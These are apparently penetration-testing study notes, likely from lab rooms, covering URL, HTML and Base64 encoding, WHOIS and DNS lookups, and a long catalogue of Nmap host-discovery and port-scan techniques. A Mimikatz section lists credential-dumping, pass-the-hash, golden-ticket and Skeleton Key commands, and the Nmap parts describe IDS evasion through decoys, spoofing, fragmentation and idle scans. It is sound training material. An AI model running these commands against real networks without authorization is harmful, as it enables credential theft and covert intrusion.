URL: It involves exchanging characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). Url encoding is an extremely useful method to know for any kind of web application testing.
For example, let's encode the forward-slash character (/). The ASCII character code for a forward slash is 47. This is "2F" in hexadecimal, making the URL encoded forward-slash %2F.

HTML: Encoding text as HTML Entities involves replacing special characters with an ampersand (&) followed by either a hexadecimal number or a reference to the character being escaped, then a semicolon (;). For example, a quotation mark has its own reference: &quot;. When this is inserted into a webpage, it will be replaced by a double quotation mark ("). This encoding method allows special characters in the HTML language to be rendered safely in HTML pages and has the added bonus of being used to prevent attacks such as XSS (Cross-Site Scripting).

Base64: Another widely used encoding method, base64 is used to encode any data in an ASCII-compatible format. It was designed to take binary data (e.g. images, media, programs) and encode it in a format that would be suitable to transfer over virtually any medium

ASCII Hex: This option converts data between ASCII representation and hexadecimal representation. For example, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each letter in the original data is taken individually and converted from numeric ASCII representation into hexadecimal. For example, the letter "A" in ASCII has a decimal character code of 65. In hexadecimal, this is 41. Similarly, the letter "S" can be converted to hexadecimal 53, and so on.
-=-=-=-=
Mimikatz 
Here are just some of the most popular Mimikatz command and related functionality.

    CRYPTO::Certificates – list/export certificates
    KERBEROS::Golden – create golden/silver/trust tickets
    KERBEROS::List – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.
    KERBEROS::PTT – pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).
    LSADUMP::DCSync – ask a DC to synchronize an object (get password data for account). No need to run code on DC.
    LSADUMP::LSA – Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”
    LSADUMP::SAM – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
    LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
    MISC::AddSid – Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.
    MISC::MemSSP – Inject a malicious Windows SSP to log locally authenticated credentials.
    MISC::Skeleton – Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.
    PRIVILEGE::Debug – get debug rights (this or Local System rights is required for many Mimikatz commands).
    SEKURLSA::Ekeys – list Kerberos encryption keys
    SEKURLSA::Kerberos – List Kerberos credentials for all authenticated users (including services and computer account)
    SEKURLSA::Krbtgt – get Domain Kerberos service account (KRBTGT)password data
    SEKURLSA::LogonPasswords – lists all available provider credentials. This usually shows recently logged on user and computer credentials.
    SEKURLSA::Pth – Pass- theHash and Over-Pass-the-Hash
    SEKURLSA::Tickets – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
    TOKEN::List – list all tokens of the system
    TOKEN::Elevate – impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box
    TOKEN::Elevate /domainadmin – impersonate a token with Domain Admin credentials.


-=-=-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=-=
Passive Recon 
We use whois to query WHOIS records, while we use nslookup and dig to query DNS database records. These are all publicly available records and hence do not alert the target.

We will also learn the usage of two online services:

    DNSDumpster
    Shodan.io
    virustotal

-=-=-=
whois 
 A WHOIS server listens on TCP port 43 for incoming requests. The domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing.

-=-=-=
nslookup 
Query type 	Result
A 	IPv4 Addresses
AAAA 	IPv6 Addresses
CNAME 	Canonical Name
MX 	Mail Servers
SOA 	Start of Authority
TXT 	TXT Records

Purpose 	Commandline Example
Lookup WHOIS record 	whois tryhackme.com
Lookup DNS A records 	nslookup -type=A tryhackme.com
Lookup DNS MX records at DNS server 	nslookup -type=MX tryhackme.com 1.1.1.1
Lookup DNS TXT records 	nslookup -type=TXT tryhackme.com
Lookup DNS A records 	dig tryhackme.com A
Lookup DNS MX records at DNS server 	dig @1.1.1.1 tryhackme.com MX
Lookup DNS TXT records 	dig tryhackme.com TXT

-=-=-=-=-=-=-=-=-=-=
Active Recon
ping

On Linux, traceroute will start by sending UDP datagrams within IP packets of TTL being 1. Thus, it causes the first router to encounter a TTL=0 and send an ICMP Time-to-Live exceeded back. Hence, a TTL of 1 will reveal the IP address of the first router to you. Then it will send another packet with TTL=2; this packet will be dropped at the second router. And so on.

*The number of hops/routers between your system and the target system depends on the time you are running traceroute. There is no guarantee that your packets will always follow the same route, even if you are on the same network or you repeat the traceroute command within a short time.
*Some routers return a public IP address. You might examine a few of these routers based on the scope of the intended penetration testing.
*Some routers don’t return a reply

telnet
telnet 10.10.29.184 80 
  GET / HTTP/1.1 
  host: example

-=-=-=-=-=-=-=
nmap01

We present the different approaches that Nmap uses to discover live hosts. In particular, we cover:

    ARP scan: This scan uses ARP requests to discover live hosts
    ICMP scan: This scan uses ICMP requests to identify live hosts
    TCP/UDP ping scan: This scan sends packets to TCP ports and UDP ports to determine live hosts.

We also introduce two scanners, arp-scan and masscan, and explain how they overlap with part of Nmap’s host discovery.

Starting from bottom to top, we can use:

    ARP from Link Layer
    ICMP from Network Layer
    TCP from Transport Layer
    UDP from Transport Layer

ICMP has many types. ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply).
-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using ARP 
If you want to ping a system on the same subnet, an ARP query should precede the ICMP Echo.

Although TCP and UDP are transport layers, for network scanning purposes, a scanner can send a specially-crafted packet to common TCP or UDP ports to check whether the target will respond. This method is efficient, especially when ICMP Echo is blocked.


There are various ways to discover online hosts. When no host discovery options are provided, Nmap follows the following approaches to discover live hosts:

    When a privileged user tries to scan targets on a local network (Ethernet), Nmap uses ARP requests. A privileged user is root or a user who belongs to sudoers and can run sudo.
    When a privileged user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.
    When an unprivileged user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.

Nmap, by default, uses a ping scan to find live hosts, then proceeds to scan live hosts only. If you want to use Nmap to discover online hosts without port-scanning the live systems, you can issue nmap -sn TARGETS. Let’s dig deeper to gain a solid understanding of the different techniques used.

ARP scan is possible only if you are on the same subnet as the target systems. On an Ethernet (802.3) and WiFi (802.11), you need to know the MAC address of any system before you can communicate with it. The MAC address is necessary for the link-layer header; the header contains the source MAC address and the destination MAC address among other fields. To get the MAC address, the OS sends an ARP query. A host that replies to ARP queries is up. The ARP query only works if the target is on the same subnet as yourself, i.e., on the same Ethernet/WiFi. You should expect to see many ARP queries generated during a Nmap scan of a local network. If you want Nmap only to perform an ARP scan without port-scanning, you can use nmap -PR -sn TARGETS, where -PR indicates that you only want an ARP scan. The following example shows Nmap using ARP for host discovery without any port scanning. We run nmap -PR -sn MACHINE_IP/24 to discover all the live systems on the same subnet as our target machine.

nmap -PR -sn 10.10.223.163/24

arp-scan --localnet OR arp-scan -l 
arp-scan -I eth0 -l
-=-=-=-=-=--=-=-=-=-=
Host Discovery using ICMP
To use ICMP echo request to discover live hosts, add the option -PE. (Remember to add -sn if you don’t want to follow that with a port scan.) As shown in the following figure, an ICMP echo scan works by sending an ICMP echo request and expects the target to reply with an ICMP echo reply if it is online.

#ICMP Echo
nmap -PE -sn 10.10.223.163/24
###The scan output shows that eight hosts are up; moreover, it shows their MAC addresses. Generally speaking, we don’t expect to learn the MAC addresses of the targets unless they are on the same subnet as our system. The output above indicates that Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.###

Because ICMP echo requests tend to be blocked, you might also consider ICMP Timestamp or ICMP Address Mask requests to tell if a system is online. Nmap uses timestamp request (ICMP Type 13) and checks whether it will get a Timestamp reply (ICMP Type 14). Adding the -PP option tells Nmap to use ICMP timestamp requests.

#ICMP Timestamp
nmap -PP -sn 10.10.223.163/24

Similarly, Nmap uses address mask queries (ICMP Type 17) and checks whether it gets an address mask reply (ICMP Type 18). This scan can be enabled with the option -PM.
#ICMP Address Mask
nmap -PM -sn 10.10.223.163/24
-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using TCP and UDP
If you want Nmap to use TCP SYN ping, you can do so via the option -PS followed by the port number, range, list, or a combination of them. For example, -PS21 will target port 21, while -PS21-25 will target ports 21, 22, 23, 24, and 25. Finally -PS80,443,8080 will target the three ports 80, 443, and 8080.

Privileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open, as shown in the figure below. Unprivileged users have no choice but to complete the 3-way handshake if the port is open.

#TCP SYN ping
nmap -PS -sn MACHINE_IP/24 
#Technically speaking, since we didn’t specify any TCP ports to use in the TCP ping scan, Nmap used common ports; in this case, it is TCP port 80. Any service listening on port 80 is expected to reply, indirectly indicating that the host is online.


TCP ACK Ping

As you have guessed, this sends a packet with an ACK flag set. You must be running Nmap as a privileged user to be able to accomplish this. If you try it as an unprivileged user, Nmap will attempt a 3-way handshake.

By default, port 80 is used. The syntax is similar to TCP SYN ping. -PA should be followed by a port number, range, list, or a combination of them. For example, consider -PA21, -PA21-25 and -PA80,443,8080. If no port is specified, port 80 will be used.

The following figure shows that any TCP packet with an ACK flag should get a TCP packet back with an RST flag set. The target responds with the RST flag set because the TCP packet with the ACK flag is not part of any ongoing connection. The expected response is used to detect if the target host is up.

In this example, we run sudo nmap -PA -sn MACHINE_IP/24 to discover the online hosts on the target’s subnet

-=-=-=-=
UDP Ping

Finally, we can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available.

In the following figure, we see a UDP packet sent to an open UDP port and not triggering any response. However, sending a UDP packet to any closed UDP port can trigger a response indirectly indicating that the target is online.

The syntax to specify the ports is similar to that of TCP SYN ping and TCP ACK ping; Nmap uses -PU for UDP ping.

-=-=-==-
Masscan
However, to finish its network scan quickly, Masscan is quite aggressive with the rate of packets it generates. The syntax is quite similar: -p can be followed by a port number, list, or range. Consider the following examples:

    masscan MACHINE_IP/24 -p443
    masscan MACHINE_IP/24 -p80,443
    masscan MACHINE_IP/24 -p22-25
    masscan MACHINE_IP/24 ‐‐top-ports 100

-=-==-=-=-=-=-=-=-
Using reverse-dns lookup 
Nmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use -n to skip this step.

By default, Nmap will look up online hosts; however, you can use the option -R to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the --dns-servers DNS_SERVER option


SUMMARY
Scan Type 	        Example Command
ARP Scan 	        sudo nmap -PR -sn MACHINE_IP/24
ICMP Echo Scan 	        sudo nmap -PE -sn MACHINE_IP/24
ICMP Timestamp Scan 	sudo nmap -PP -sn MACHINE_IP/24
ICMP Address Mask Scan 	sudo nmap -PM -sn MACHINE_IP/24
TCP SYN Ping Scan 	sudo nmap -PS22,80,443 -sn MACHINE_IP/30
TCP ACK Ping Scan 	sudo nmap -PA22,80,443 -sn MACHINE_IP/30
UDP Ping Scan 	        sudo nmap -PU53,161,162 -sn MACHINE_IP/30

Remember to add -sn if you are only interested in host discovery without port-scanning. Omitting -sn will let Nmap default to port-scanning the live hosts.
Option 	Purpose
-n 	no DNS lookup
-R 	reverse-DNS lookup for all hosts
-sn 	host discovery only. Don't scan ports, just probe to see if the host exists
–traceroute: uses an existing probe method to do a full traceroute. Very clever way to map a network even when most stuff is shut down; if you can get a response from, say, ICMP timestamps you can use that to do the traceroute.



    -Pn: no discovery, just assume the host is up.
    -PS: TCP SYN. Tries to open a TCP port; getting back an ACK or RST will both confirm the host is online, so it works whether the port is open or not. Default is port 80, do “-PS99” or whatever to change the port number.
    -PA: TCP ACK. Sends a bogus ACK, expecting a RST back.
    -PU: UDP. Should get an ICMP port unreachable response.
    -PY: SCTP INIT. Similar to -PS, but tries to open an SCTP connection.
    -PE: ICMP echo. Good ol ping
    -PP: ICMP timestamp. One of those tech dead ends that should be removed or disabled (indeed, it’s not present in IPv6). My Linux server seems to respond with the correct time!
    -PM: ICMP address mask. A way to query the subnet mask. Kind of a useful thing really, but Linux doesn’t seem to answer it. Maybe disabled for security?
    -PO: IP protocol ping. Sends unusual IP protocol requests; ICMP, IGMP, and IP-in-IP by default. My Linux datacenter box doesn’t respond to IGMP or IP-in-IP probes.
    -PR: ARP ping. For local ethernets only, bypasses the kernel’s ARP handling and handles ARP itself.  Any ARP reply implies the host exists. Note this is on by default for local networks and short-circuits other types of requests.
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Scanning ports with NMAP
Nmap considers the following six states:

    Open: indicates that a service is listening on the specified port.
    Closed: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances/programs.
    Filtered: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.
    Unfiltered: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan -sA.
    Open|Filtered: This means that Nmap cannot determine whether the port is open or filtered.
    Closed|Filtered: This means that Nmap cannot decide whether a port is closed or filtered.


-=-=-=
TCP flags in the TCP header
Setting a flag bit means setting its value to 1. From left to right, the TCP header flags are:

    URG: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.
    ACK: Acknowledgement flag indicates that the acknowledgement number is significant. It is used to acknowledge the receipt of a TCP segment.
    PSH: Push flag asking TCP to pass the data to the application promptly.
    RST: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.
    SYN: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.
    FIN: The sender has no more data to send.

-=-=-=-
TCP connect scan
We are interested in learning whether the TCP port is open, not establishing a TCP connection. Hence the connection is torn as soon as its state is confirmed by sending a RST/ACK. You can choose to run TCP connect scan using -sT. It is important to note that if you are not a privileged user (root or sudoer), a TCP connect scan is the only possible option to discover open TCP ports.  A closed TCP port responds to a SYN packet with RST/ACK to indicate that it is not open
-sT 

SYN>
<SYN,ACK 
ACK>
RST,ACK>

Note that we can use -F to enable fast mode and decrease the number of scanned ports from 1000 to 100 most common ports.

It is worth mentioning that the -r option can also be added to scan the ports in consecutive order instead of random order. This option is useful when testing whether ports open in a consistent manner, for instance, when a target boots up
-=-=-=-==-
TCP SYN Scan 
Unprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it. SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server. Because we didn’t establish a TCP connection, this decreases the chances of the scan being logged. We can select this scan type by using the -sS option

We can see a TCP connect scan -sT traffic. Any open TCP port will require Nmap to complete the TCP 3-way handshake before closing the connection. In the lower half of the following figure, we see how a SYN scan -sS does not need to complete the TCP 3-way handshake; instead, Nmap sends an RST packet once a SYN/ACK packet is received.

TCP SYN scan is the default scan mode when running Nmap as a privileged user, running as root or using sudo, and it is a very reliable choice

-=-=-=-=-=
UDP Scan 
UDP is a connectionless protocol, and hence it does not require any handshake for connection establishment. We cannot guarantee that a service listening on a UDP port would respond to our packets. However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned. You can select UDP scan using the -sU option; moreover, you can combine it with another TCP scan.

The following figure shows that if we send a UDP packet to an open UDP port, we cannot expect any reply in return. Therefore, sending a UDP packet to an open port won’t tell us anything.

However, as shown in the figure below, we expect to get an ICMP packet of type 3, destination unreachable, and code 3, port unreachable. In other words, the UDP ports that don’t generate any response are the ones that Nmap will state as open.
-=-=-=-=-
Fine tuning 


You can specify the ports you want to scan instead of the default 1000 ports. Specifying the ports is intuitive by now. Let’s see some examples:

    port list: -p22,80,443 will scan ports 22, 80 and 443.
    port range: -p1-1023 will scan all ports between 1 and 1023 inclusive, while -p20-25 will scan ports between 20 and 25 inclusive.

You can request the scan of all ports by using -p-, which will scan all 65535 ports. If you want to scan the most common 100 ports, add -F. Using --top-ports 10 will check the ten most common ports.

You can control the scan timing using -T<0-5>. -T0 is the slowest (paranoid), while -T5 is the fastest. According to Nmap manual page, there are six templates:

    paranoid (0)
    sneaky (1)
    polite (2)
    normal (3)
    aggressive (4)
    insane (5)

To avoid IDS alerts, you might consider -T0 or -T1. For instance, -T0 scans one port at a time and waits 5 minutes between sending each probe, so you can guess how long scanning one target would take to finish. If you don’t specify any timing, Nmap uses normal -T3. Note that -T5 is the most aggressive in terms of speed; however, this can affect the accuracy of the scan results due to the increased likelihood of packet loss. Note that -T4 is often used during CTFs and when learning to scan on practice targets, whereas -T1 is often used during real engagements where stealth is more important.

Alternatively, you can choose to control the packet rate using --min-rate <number> and --max-rate <number>. For example, --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.

Moreover, you can control probing parallelization using --min-parallelism <numprobes> and --max-parallelism <numprobes>. Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. For instance, --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel; these 512 probes are related to host discovery and open ports.

-=-=
Summary 
This room covered three types of scans.
Port Scan Type 	        Example Command
TCP Connect Scan 	nmap -sT MACHINE_IP
TCP SYN Scan 	        sudo nmap -sS MACHINE_IP
UDP Scan 	        sudo nmap -sU MACHINE_IP

These scan types should get you started discovering running TCP and UDP services on a target host.
Option 	        Purpose
-p- 	        all ports
-p1-1023 	scan ports 1 to 1023
-F 	        100 most common ports
-r 	        scan ports in consecutive order
-T<0-5> 	-T0 being the slowest and T5 the fastest
--max-rate 50 	rate <= 50 packets/sec
--min-rate 15 	rate >= 15 packets/sec
--min-parallelism 100 	at least 100 probes in parallel
-=-=-=-=-=-=-=-
NMAP advanced port scans


Let’s start with the following three types of scans:

    Null Scan
    FIN Scan
    Xmas Scan


TCP Null Scan

The null scan does not set any flag; all six flag bits are set to zero. You can choose this scan using the -sN option. A TCP packet with no flags set will not trigger any response when it reaches an open port, as shown in the figure below. Therefore, from Nmap’s perspective, a lack of reply in a null scan indicates that either the port is open or a firewall is blocking the packet.

However, we expect the target server to respond with an RST packet if the port is closed. Consequently, we can use the lack of RST response to figure out the ports that are not closed: open or filtered
 Because the null scan relies on the lack of a response to infer that the port is not closed, it cannot indicate with certainty that these ports are open; there is a possibility that the ports are not responding due to a firewall rule.

-=-=
TCP FIN Scan

The FIN scan sends a TCP packet with the FIN flag set. You can choose this scan type using the -sF option. Similarly, no response will be sent if the TCP port is open. Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic related to this TCP port.

However, the target system should respond with an RST if the port is closed. Consequently, we will be able to know which ports are closed and use this knowledge to infer the ports that are open or filtered. It's worth noting some firewalls will 'silently' drop the traffic without sending an RST.

-=-=-=-
TCP Xmas Scan

The Xmas scan gets its name after Christmas tree lights. An Xmas scan sets the FIN, PSH, and URG flags simultaneously. You can select Xmas scan with the option -sX.

Like the Null scan and FIN scan, if an RST packet is received, it means that the port is closed. Otherwise, it will be reported as open|filtered.


On scenario where these three scan types can be efficient is when scanning a target behind a stateless (non-stateful) firewall. A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.

-=-=-=
TCP Maimon scan
In this scan, the FIN and ACK bits are set. The target should send an RST packet as a response. However, certain BSD-derived systems drop the packet if it is an open port exposing the open ports. This scan won’t work on most targets encountered in modern networks; however, we include it in this room to better understand the port scanning mechanism and the hacking mindset. To select this scan type, use the -sM option.

Most target systems respond with an RST packet regardless of whether the TCP port is open. In such a case, we won’t be able to discover the open ports. The figure below shows the expected behaviour in the cases of both open and closed TCP ports
As mentioned, because open ports and closed ports are behaving the same way, the Maimon scan could not discover any open ports on the target system.
This type of scan is not the first scan one would pick to discover a system; however, it is important to know about it as you don’t know when it could come in handy

-=-=-=-=-=-=-=-
This task will cover how to perform a TCP ACK scan, a TCP window scan, and how to create your custom flag scan.

TCP ACK Scan

Let’s start with the TCP ACK scan. As the name implies, an ACK scan will send a TCP packet with the ACK flag set. Use the -sA option to choose this scan. As we show in the figure below, the target would respond to the ACK with RST regardless of the state of the port. This behaviour happens because a TCP packet with the ACK flag set should be sent only in response to a received TCP packet to acknowledge the receipt of some data, unlike our case. Hence, this scan won’t tell us whether the target port is open in a simple setup.

This kind of scan would be helpful if there is a firewall in front of the target. Consequently, based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall. In other words, this type of scan is more suitable to discover firewall rule sets and configuration.

After setting up the target VM 10.10.255.227 with a firewall, we repeated the ACK scan. This time, we received some interesting results. As seen in the console output below, we have three ports that aren't being blocked by the firewall. This result indicates that the firewall is blocking all other ports except for these three ports.



Window Scan

Another similar scan is the TCP window scan. The TCP window scan is almost the same as the ACK scan; however, it examines the TCP Window field of the RST packets returned. On specific systems, this can reveal that the port is open. You can select this scan type with the option -sW. As shown in the figure below, we expect to get an RST packet in reply to our “uninvited” ACK packets, regardless of whether the port is open or closed.

However, as you would expect, if we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results. In the console output shown below, the TCP window scan pointed that three ports are detected as closed. (This is in contrast with the ACK scan that labelled the same three ports as unfiltered.) Although we know that these three ports are not closed, we realize they responded differently, indicating that the firewall does not block them.


Custom Scan

If you want to experiment with a new TCP flag combination beyond the built-in TCP scan types, you can do so using --scanflags. For instance, if you want to set SYN, RST, and FIN simultaneously, you can do so using --scanflags RSTSYNFIN. As shown in the figure below, if you develop your custom scan, you need to know how the different ports will behave to interpret the results in different scenarios correctly.

Finally, it is essential to note that the ACK scan and the window scan were very efficient at helping us map out the firewall rules. However, it is vital to remember that just because a firewall is not blocking a specific port, it does not necessarily mean that a service is listening on that port. For example, there is a possibility that the firewall rules need to be updated to reflect recent service changes. Hence, ACK and window scans are exposing the firewall rules, not the services.

-=-=-=-=-=-
Spoofing and Decoys 

n some network setups, you will be able to scan a target system using a spoofed IP address and even a spoofed MAC address. Such a scan is only beneficial in a situation where you can guarantee to capture the response. If you try to scan a target from some random network using a spoofed IP address, chances are you won’t have any response routed to you, and the scan results could be unreliable.

The following figure shows the attacker launching the command nmap -S SPOOFED_IP 10.10.255.227. Consequently, Nmap will craft all the packets using the provided source IP address SPOOFED_IP. The target machine will respond to the incoming packets sending the replies to the destination IP address SPOOFED_IP. For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies.


In brief, scanning with a spoofed IP address is three steps:

    Attacker sends a packet with a spoofed source IP address to the target machine.
    Target machine replies to the spoofed IP address as the destination.
    Attacker captures the replies to figure out open ports.

In general, you expect to specify the network interface using -e and to explicitly disable ping scan -Pn. Therefore, instead of nmap -S SPOOFED_IP 10.10.255.227, you will need to issue nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.255.227 to tell Nmap explicitly which network interface to use and not to expect to receive a ping reply. It is worth repeating that this scan will be useless if the attacker system cannot monitor the network for responses.

When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using --spoof-mac SPOOFED_MAC. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).

Spoofing only works in a minimal number of cases where certain conditions are met. Therefore, the attacker might resort to using decoys to make it more challenging to be pinpointed. The concept is simple, make the scan appears to be coming from many IP addresses so that the attacker’s IP address would be lost among them. As we see in the figure below, the scan of the target machine will appear to be coming from 3 different sources, and consequently, the replies will go the decoys as well.

You can launch a decoy scan by specifying a specific or random IP address after -D. For example, nmap -D 10.10.0.1,10.10.0.2,ME 10.10.255.227 will make the scan of 10.10.255.227 appear as coming from the IP addresses 10.10.0.1, 10.10.0.2, and then ME to indicate that your IP address should appear in the third order. Another example command would be nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.255.227, where the third and fourth source IP addresses are assigned randomly, while the fifth source is going to be the attacker’s IP address. In other words, each time you execute the latter command, you would expect two new random IP addresses to be the third and fourth decoy sources.


-=-=-=-=
Fragmented packets

Firewall

A firewall is a piece of software or hardware that permits packets to pass through or blocks them. It functions based on firewall rules, summarized as blocking all traffic with exceptions or allowing all traffic with exceptions. For instance, you might block all traffic to your server except those coming to your web server. A traditional firewall inspects, at least, the IP header and the transport layer header. A more sophisticated firewall would also try to examine the data carried by the transport layer.

IDS

An intrusion detection system (IDS) inspects network packets for select behavioural patterns or specific content signatures. It raises an alert whenever a malicious rule is met. In addition to the IP header and transport layer header, an IDS would inspect the data contents in the transport layer and check if it matches any malicious patterns. How can you make it less likely for a traditional firewall/IDS to detect your Nmap activity? It is not easy to answer this; however, depending on the type of firewall/IDS, you might benefit from dividing the packet into smaller packets.

Fragmented Packets

Nmap provides the option -f to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another -f (-f -f or -ff) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the --mtu; however, you should always choose a multiple of 8.

To properly understand fragmentation, we need to look at the IP header in the figure below. It might look complicated at first, but we notice that we know most of its fields. In particular, notice the source address taking 32 bits (4 bytes) on the fourth row, while the destination address is taking another 4 bytes on the fifth row. The data that we will fragment across multiple packets is highlighted in red. To aid in the reassembly on the recipient side, IP uses the identification (ID) and fragment offset, shown on the second row of the figure below.


Let’s compare running sudo nmap -sS -p80 10.20.30.144 and sudo nmap -sS -p80 -f 10.20.30.144. As you know by now, this will use stealth TCP SYN scan on port 80; however, in the second command, we are requesting Nmap to fragment the IP packets.

In the first two lines, we can see an ARP query and response. Nmap issued an ARP query because the target is on the same Ethernet. The second two lines show a TCP SYN ping and a reply. The fifth line is the beginning of the port scan; Nmap sends a TCP SYN packet to port 80. In this case, the IP header is 20 bytes, and the TCP header is 24 bytes. Note that the minimum size of the TCP header is 20 bytes.

With fragmentation requested via -f, the 24 bytes of the TCP header will be divided into multiples of 8 bytes, with the last fragment containing 8 bytes or less of the TCP header. Since 24 is divisible by 8, we got 3 IP fragments; each has 20 bytes of IP header and 8 bytes of TCP header. We can see the three fragments between the fifth and the seventh lines.

Note that if you added -ff (or -f -f), the fragmentation of the data will be multiples of 16. In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.

On the other hand, if you prefer to increase the size of your packets to make them look innocuous, you can use the option --data-length NUM, where num specifies the number of bytes you want to append to your packets.
-=-=-=-=-
Idle/Zombie Scan 
Spoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.

The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using nmap -sI ZOMBIE_IP 10.10.148.44, where ZOMBIE_IP is the IP address of the idle host (zombie).

The idle (zombie) scan requires the following three steps to discover whether a port is open:

    Trigger the idle host to respond so that you can record the current IP ID on the idle host.
    Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.
    Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.

Let’s explain with figures. In the figure below, we have the attacker system probing an idle machine, a multi-function printer. By sending a SYN/ACK, it responds with an RST packet containing its newly incremented IP ID.

1. The attacker will send a SYN packet to the TCP port they want to check on the target machine in the next step. However, this packet will use the idle host (zombie) IP address as the source. Three scenarios would arise. In the first scenario, shown in the figure below, the TCP port is closed; therefore, the target machine responds to the idle host with an RST packet. The idle host does not respond; hence its IP ID is not incremented.

2. In the second scenario, as shown below, the TCP port is open, so the target machine responds with a SYN/ACK to the idle host (zombie). The idle host responds to this unexpected packet with an RST packet, thus incrementing its IP ID.

3. In the third scenario, the target machine does not respond at all due to firewall rules. This lack of response will lead to the same result as with the closed port; the idle host won’t increase the IP ID.

For the final step, the attacker sends another SYN/ACK to the idle host. The idle host responds with an RST packet, incrementing the IP ID by one again. The attacker needs to compare the IP ID of the RST packet received in the first step with the IP ID of the RST packet received in this third step. If the difference is 1, it means the port on the target machine was closed or filtered. However, if the difference is 2, it means that the port on the target was open.

It is worth repeating that this scan is called an idle scan because choosing an idle host is indispensable for the accuracy of the scan. If the “idle host” is busy, all the returned IP IDs would be useless.
-=-=-=-
Getting more details

--reason 
-vvv
-dd 

-=-=-=
Summary
This room covered the following types of scans.
Port Scan Type 	             Example Command
TCP Null Scan 	             sudo nmap -sN 10.10.3.241
TCP FIN Scan 	             sudo nmap -sF 10.10.3.241
TCP Xmas Scan 	             sudo nmap -sX 10.10.3.241
TCP Maimon Scan              sudo nmap -sM 10.10.3.241
TCP ACK Scan 	             sudo nmap -sA 10.10.3.241
TCP Window Scan              sudo nmap -sW 10.10.3.241
